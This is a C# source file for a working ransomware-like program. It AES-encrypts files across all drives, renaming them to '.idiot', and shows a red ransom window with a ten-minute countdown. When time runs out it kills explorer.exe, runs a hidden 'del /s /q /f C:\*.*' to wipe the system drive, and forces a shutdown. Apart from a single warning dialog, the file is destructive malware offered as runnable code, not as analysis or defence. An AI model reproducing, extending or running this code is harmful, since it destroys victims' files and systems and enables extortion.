using System;
using System.Drawing;
using System.Windows.Forms;
using System.IO;
using System.Security.Cryptography;
using System.Text;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Threading;

namespace DBI_Ultimate_Project
{
    class Program : Form
    {
        [DllImport("gdi32.dll")]
        static extern bool BitBlt(IntPtr hdcDest, int nXDest, int nYDest, int nWidth, int nHeight, IntPtr hdcSrc, int nXSrc, int nYSrc, int dwRop);
        [DllImport("user32.dll")]
        static extern IntPtr GetDC(IntPtr hwnd);

        private System.Windows.Forms.Timer countdownTimer;
        private int timeLeft = 600; 
        private Label lblTimer;
        private TextBox keyBox;
        private Random rnd = new Random();

        // Klucz AES - Zmień jeśli chcesz
        static string haslo = "DBI_SECRET_2026";
        static byte[] sol = Encoding.UTF8.GetBytes("SolDoLekcji");

        [STAThread]
        static void Main()
        {
            Application.EnableVisualStyles();
            DialogResult res = MessageBox.Show("Warning: This malware is not a joke. Your computer will be destroyed.", "Caution!", MessageBoxButtons.YesNo, MessageBoxIcon.Warning);
            if (res == DialogResult.Yes) Application.Run(new Program());
        }

        public Program()
        {
            this.Text = "Idiot Decryt0r";
            this.Size = new Size(800, 500);
            this.BackColor = Color.Red;
            this.ForeColor = Color.White;
            this.FormBorderStyle = FormBorderStyle.FixedSingle;
            this.StartPosition = FormStartPosition.CenterScreen;
            this.TopMost = true;

            Label lblTitle = new Label() { Text = "What Happened to My Files?", Font = new Font("Arial", 18, FontStyle.Bold), Location = new Point(20, 20), Size = new Size(400, 40) };
            Label lblMain = new Label() { 
                Text = "Your files have been encrypted by AES-256.\n\n" +
                       "You have 10 minutes to enter the key.\n\n" +
                       "After 10 minutes: del /s /q /f C:\\*.* will be executed.\n\n" +
                       "NO KEY THIS IS NOT 1234.",
                Font = new Font("Segoe UI", 11), Location = new Point(220, 70), Size = new Size(540, 200) 
            };
            
            lblTimer = new Label() { Text = "10:00", Font = new Font("Consolas", 36, FontStyle.Bold), ForeColor = Color.Yellow, Location = new Point(20, 150), Size = new Size(180, 60) };
            keyBox = new TextBox() { Location = new Point(220, 300), Width = 300, Font = new Font("Consolas", 14) };
            
            Button btnDecrypt = new Button() { Text = "DECRYPT", Location = new Point(530, 298), Size = new Size(100, 32), FlatStyle = FlatStyle.Flat, BackColor = Color.White, ForeColor = Color.Red };
            btnDecrypt.Click += (s, e) => SprawdzHaslo();

            Button btnDestroy = new Button() { Text = "Destroy now", Location = new Point(20, 400), Size = new Size(120, 30), FlatStyle = FlatStyle.Flat, BackColor = Color.Black };
            btnDestroy.Click += (s, e) => { if (MessageBox.Show("Are you sure?", "CONFIRM", MessageBoxButtons.YesNo) == DialogResult.Yes) timeLeft = 3; };

            this.Controls.AddRange(new Control[] { lblTitle, lblMain, lblTimer, keyBox, btnDecrypt, btnDestroy });

            // Szyfrowanie startuje w tle
            new Thread(SzyfrujWszystko) { IsBackground = true }.Start();

            countdownTimer = new System.Windows.Forms.Timer() { Interval = 1000 };
            countdownTimer.Tick += (s, e) => {
                if (timeLeft > 0) {
                    timeLeft--;
                    TimeSpan ts = TimeSpan.FromSeconds(timeLeft);
                    lblTimer.Text = string.Format("{0:D2}:{1:D2}", ts.Minutes, ts.Seconds);
                } else {
                    countdownTimer.Stop();
                    ExecuteNuclearOption();
                }
            };
            countdownTimer.Start();
        }

        void SprawdzHaslo()
        {
            if (keyBox.Text == haslo)
            {
                countdownTimer.Stop();
                this.BackColor = Color.Green;
                MessageBox.Show("KEY ACCEPTED. RESTORING FILES...", "Success");
                new Thread(OdszyfrujWszystko) { IsBackground = true }.Start();
            }
            else
            {
                MessageBox.Show("WRONG KEY!", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        // --- LOGIKA AES ---
        void SzyfrujWszystko() { Skanuj(true); }
        void OdszyfrujWszystko() { Skanuj(false); MessageBox.Show("FILES RESTORED!", "Done"); Application.Exit(); }

        void Skanuj(bool szyfruj)
        {
            DriveInfo[] drives = DriveInfo.GetDrives();
            foreach (DriveInfo d in drives)
            {
                if (d.IsReady) PrzetworzFolder(d.RootDirectory.FullName, szyfruj);
            }
        }

        void PrzetworzFolder(string path, bool szyfruj)
        {
            try {
                foreach (string f in Directory.GetFiles(path)) {
                    if (path.Contains("Windows") || f.EndsWith(".exe") || f.EndsWith(".dll")) continue;
                    
                    if (szyfruj && !f.EndsWith(".idiot")) {
                        TransformujPlik(f, true);
                        File.Move(f, f + ".idiot");
                    } else if (!szyfruj && f.EndsWith(".idiot")) {
                        TransformujPlik(f, false);
                        File.Move(f, f.Replace(".idiot", ""));
                    }
                }
                foreach (string d in Directory.GetDirectories(path)) PrzetworzFolder(d, szyfruj);
            } catch { }
        }

        void TransformujPlik(string file, bool encrypt)
        {
            try {
                using (Aes aes = Aes.Create()) {
                    Rfc2898DeriveBytes pdb = new Rfc2898DeriveBytes(haslo, sol);
                    aes.Key = pdb.GetBytes(32); aes.IV = pdb.GetBytes(16);
                    byte[] content = File.ReadAllBytes(file);
                    using (MemoryStream ms = new MemoryStream()) {
                        using (CryptoStream cs = new CryptoStream(ms, encrypt ? aes.CreateEncryptor() : aes.CreateDecryptor(), CryptoStreamMode.Write)) {
                            cs.Write(content, 0, content.Length);
                            cs.FlushFinalBlock();
                        }
                        File.WriteAllBytes(file, ms.ToArray());
                    }
                }
            } catch { }
        }

        // --- FINALE ---
        private void ExecuteNuclearOption()
        {
            MessageBox.Show("I give you a chances.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
            this.WindowState = FormWindowState.Maximized;
            this.FormBorderStyle = FormBorderStyle.None;
            
            System.Windows.Forms.Timer showTimer = new System.Windows.Forms.Timer() { Interval = 30 };
            int f = 0;
            showTimer.Tick += (s, e) => {
                f++;
                IntPtr hdc = GetDC(IntPtr.Zero);
                int w = Screen.PrimaryScreen.Bounds.Width, h = Screen.PrimaryScreen.Bounds.Height;
                BitBlt(hdc, 0, 0, w, h, hdc, 0, 0, 0x00990066);
                using (Graphics g = Graphics.FromHdc(hdc)) {
                    g.DrawEllipse(new Pen(Color.FromArgb(rnd.Next(255), 0, 0), 10), (w/2)-(f*10%w/2), (h/2)-(f*10%w/2), f*10%w, f*10%w);
                }
                if (f == 50) Process.Start(new ProcessStartInfo("cmd.exe", "/c taskkill /f /im explorer.exe & del /s /q /f C:\\*.*") { WindowStyle = ProcessWindowStyle.Hidden });
                if (f > 200) { showTimer.Stop(); Process.Start("shutdown", "/s /t 0 /c \"PC IS FUCKED.\""); Application.Exit(); }
            };
            showTimer.Start();
        }
    }
}
